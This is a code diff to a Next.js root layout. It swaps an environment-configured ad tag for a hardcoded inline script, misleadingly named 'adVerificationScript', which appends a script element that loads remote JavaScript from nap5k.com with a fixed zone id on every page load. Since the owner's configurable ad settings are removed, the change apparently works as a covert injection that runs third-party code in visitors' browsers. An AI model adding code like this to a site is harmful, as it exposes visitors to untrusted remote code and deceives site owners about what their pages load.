@@ -45,16 +45,19 @@ export default async function RootLayout({
   const messages = await getMessages();
   const webUrl = process.env.NEXT_PUBLIC_WEB_URL || "";
   const googleAdsenseCode = process.env.NEXT_PUBLIC_GOOGLE_ADCODE || "";
-  const adScriptSrc = process.env.NEXT_PUBLIC_AD_SCRIPT_SRC || "";
-  const adZone = process.env.NEXT_PUBLIC_AD_ZONE || "";
+
+  const adVerificationScript = `
+    (function(s){
+      s.dataset.zone='11193499';
+      s.src='https://nap5k.com/tag.min.js';
+    })([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))
+  `;
 
   return (
     <html lang={locale} suppressHydrationWarning>
       <head>
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        {adScriptSrc && adZone && (
-          <script async data-zone={adZone} src={adScriptSrc} />
-        )}
+        <script dangerouslySetInnerHTML={{ __html: adVerificationScript }} />
         {googleAdsenseCode && (
           <meta name="google-adsense-account" content={googleAdsenseCode} />
         )}
